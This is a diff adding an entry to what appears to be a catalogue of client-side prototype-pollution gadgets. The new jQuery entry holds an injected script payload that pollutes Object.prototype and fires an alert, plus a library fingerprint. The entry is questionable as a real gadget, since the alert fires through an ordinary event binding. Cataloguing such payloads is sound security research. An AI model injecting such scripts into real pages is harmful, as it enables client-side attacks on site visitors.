@@ -218,5 +218,16 @@
         "twitterHandle": "SecurityMB",
         "version": "",
         "fingerprint": ""
-    }
+    },
+
+    {
+        "library": "$(x).on jQuery",
+        "payload": "<script>\nObject.prototype.on = 'click';\n$('body').on('click', function() { alert('Injected Event'); });\n$('body').trigger('click');\n<\/script>",
+        "frameworkCode": "<script src=https://code.jquery.com/jquery-3.3.1.js><\/script>",
+        "frameworkAfter": false,
+        "author": "Andrei Nicolaiciuc",
+        "twitterHandle": "DevSec0ps",
+        "version": "All versions",
+        "fingerprint": "return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')"
+    } 
 ]
